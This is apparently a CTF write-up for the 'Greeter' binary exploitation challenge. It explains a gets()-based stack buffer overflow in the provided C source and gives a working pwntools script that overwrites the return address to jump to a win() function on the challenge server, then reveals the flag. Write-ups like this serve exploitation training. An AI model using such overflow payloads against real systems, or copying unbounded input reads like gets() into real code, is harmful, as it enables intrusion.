# Greeter

Category: Binary Exploitation, Execution redirection
Created: Nov 5, 2020 12:45 PM
Points: 150
Solved: Yes
Subjective Difficulty: 🔥

# WriteUp:

## 🔎 Research:

When looking at the provided C code we can see a `WIN` function which obviously prints out the flag on the server:

```c
void win() {
	puts("congrats! here's your flag:");
	char flagbuf[64];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL) {
		puts("flag file not found!");
		exit(1);
	}
	fgets(flagbuf, 64, f);
	fputs(flagbuf, stdout);
	fclose(f);
}
```

So our goal is probably to redirect code execution to that function.

## 📝 Vulnerability Description:

When inspecting the main function we can see a basic [BufferOveflow Vulnerability](https://www.notion.so/Stack-based-Buffer-Overflows-8659881fbfb141d0afaca02b247e123d). Nothing more to say. We have no [Canary](https://www.notion.so/Stack-Canary-709e3077b2274a2ca080e49a68c35fd1) or other [BufferOverflow Mitigations](https://www.notion.so/Binary-exploitation-6bb56af09d9f40d38b75dd4f66f74d27).

## 🧠 Exploit Development:

Cause name is `64 bytes` long so we have to override `64bytes + rbp(8bytes) + return address(8bytes)` to WIN function:

```c
int main() {
	/* disable stream buffering */
	setvbuf(stdin,  NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	char name[64];

	puts("What's your name?");
	gets(name);
	printf("Why hello there %s!\n", name);

	return 0;
}
```

Cause there is **no** [PIE](https://www.notion.so/PIE-1fbf0cf6d422465289951e38eb7603df) we have fixed function addresses.
WIN is at `0x401220`, so exploit looks as follows:

## 🔐 Exploit Programm:

```python
from pwn import *

WIN_address = 0x401220

payload = b"A"*64+b"BBBBBBBB"+p64(WIN_address)

#p = process("./greeter")
p = remote("challenges.ctfd.io", 30249)

p.recvline() #What's your name?
p.sendline(payload)
p.interactive()
```

## 💥 Run Exploit:

![Greeter%20aaec2dbaabdf4c5aba39cb566fe1be64/successfull_exploit.png](Greeter%20aaec2dbaabdf4c5aba39cb566fe1be64/successfull_exploit.png)

**FLAG: nactf{n4v4r_us3_g3ts_5vlrDKJufaU0d8UR}**

## 🗄️ Summary / Difficulties:

Simple BufferOverflow. No challenging. Great to warm your brain up. 😉

## 🗃️ Further References:

- [Stack based Buffer Overflows](https://www.notion.so/Stack-based-Buffer-Overflows-8659881fbfb141d0afaca02b247e123d)

## 🔨 Used Tools:

- [Pwndbg](https://www.notion.so/Pwndbg-2c0c6540dc5444559bb84545f6dbbd48)

---

# Notes:

-